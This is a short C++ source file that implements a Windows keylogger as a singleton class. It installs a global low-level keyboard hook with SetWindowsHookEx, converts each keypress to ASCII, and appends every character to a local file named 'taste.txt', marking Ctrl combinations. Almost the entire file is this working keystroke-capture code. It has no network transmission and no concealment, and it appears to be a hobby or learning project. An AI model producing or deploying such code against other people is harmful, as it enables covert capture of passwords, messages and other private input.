#include "keylogger.h"


keylogger::keylogger()
{
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, &keylogger::KeyboardProc, NULL, 0);

}
keylogger::~keylogger()
{
    if (hook != NULL)
        UnhookWindowsHookEx(hook);
}

LRESULT CALLBACK keylogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {

        KBDLLHOOKSTRUCT* kbdStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);


        int virtualKeyCode = kbdStruct->vkCode;
        int scanCode = kbdStruct->scanCode;

        bool ctrlPressed = ((GetAsyncKeyState(VK_CONTROL) & 0x8000));


        BYTE keyboardState[256] = { 0 };
        GetKeyboardState(keyboardState);

        WORD asciiCode;
        if (ToAscii(virtualKeyCode, scanCode, keyboardState, &asciiCode, 0) == 1) {

            std::ofstream file("taste.txt", std::ios::app);


            if (file.is_open()) {

                if (ctrlPressed) {
                    file << "Ctrl+ " << static_cast<char>(asciiCode);
                }
                else
                    file << static_cast<char>(asciiCode);


                file.close();
            }
            else {
                std::cerr << "Eroare la deschiderea fisierului!" << std::endl;
            }
        }
    }


    return CallNextHookEx(NULL, nCode, wParam, lParam);
}
 keylogger& keylogger::GetInstance()
{
    static keylogger instance;
    return instance;
}

HHOOK keylogger::keylogger::hook;